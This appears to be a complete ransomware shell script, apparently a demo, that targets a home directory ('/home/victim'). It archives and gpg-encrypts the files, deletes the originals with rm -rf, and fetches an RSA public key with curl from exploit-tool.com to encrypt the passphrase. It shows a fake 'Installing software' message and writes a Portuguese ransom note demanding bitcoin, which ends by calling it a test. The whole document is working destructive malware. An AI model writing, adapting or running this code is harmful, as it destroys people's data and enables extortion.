: ' Insert the description of the script here

    # exit(s) status code(s)
    0 - success
    1 - fail
    '

# check if debug flag is set
if [ "${DEBUG}" = true ]; then

  set -x # enable print commands and their arguments as they are executed.
  export # show all declared variables (includes system variables)
  whoami # print current user

else

  # unset if flag is not set
  unset DEBUG

fi

# bash default parameters
set -o errexit  # make your script exit when a command fails
set -o pipefail # exit status of the last command that threw a non-zero exit code is returned
set -o nounset  # exit when your script tries to use undeclared variables

# check binaries
__HEAD=$(which head)
__TR=$(which tr)
__CUT=$(which cut)
__WHOAMI=$(which whoami)
__TAR=$(which tar)
__GPG=$(which gpg)

# warning, this will delete the original files
__remove_original=${1:-"true"}
__path=${2:-"/home/victim"}

readonly __pass_length="64"
readonly __tar_file="${__path}/files.tar.gz"
readonly __key_file="${__path}/passphrase.encrypted"
readonly __msg_file="${__path}/readme.txt"
readonly __public_key="/tmp/ransomware.pem"
readonly __public_key_url="http://exploit-tool.com/ransomware.pem"

# generate random passphrase
readonly __passphrase=$( 
    "${__HEAD}" /dev/urandom --lines 100 | 
    "${__TR}" --delete --complement '[:alnum:]' | 
    "${__CUT}" --characters -"${__pass_length}"
)

if [ ! -e "${__path}" ]; then

    # invalid path, exit with error
    echo "${__path}: path not found"
    exit 1

fi

# encrypt files
echo "Installing software... This may take a few minutes."
${__TAR} --create --gzip --file "${__tar_file}" ${__path}/* &> /dev/null || true
${__GPG} --batch --passphrase "${__passphrase}" --symmetric "${__tar_file}" &> /dev/null || true

if [ "${__remove_original}" = "true" ]; then

    # remove original files
    find "${__path}" -mindepth 1 -maxdepth 1 -not -name "*.gpg" | xargs -I{} rm -rf {}

fi

# create passphrase file
curl --silent --location "${__public_key_url}" > "${__public_key}"
echo "${__passphrase}" | openssl rsautl -encrypt -pubin -inkey "${__public_key}" > "${__key_file}"

# create message
__message=$(
cat <<EOF
  Seus arquivos foram criptografados.
Envie 1 BTC para a carteira a1b2c3d4e5. Você receberá um e-mail com as intruções
para acessar seus arquivos após a confirmação da transferência.

...

  Fique calmo esse foi apenas um teste, rode o comando a seguir para acessar a
senha e descriptografar seus arquivos:
curl -sL exploit-tool.com/ransomware-key.pem > /tmp/ransomware-key.pem &&
cat passphrase.encrypted | openssl rsautl -decrypt -inkey /tmp/ransomware-key.pem
EOF
)
echo "${__message}" > "${__msg_file}"
echo "Installation completed! Happy Hacking :)"
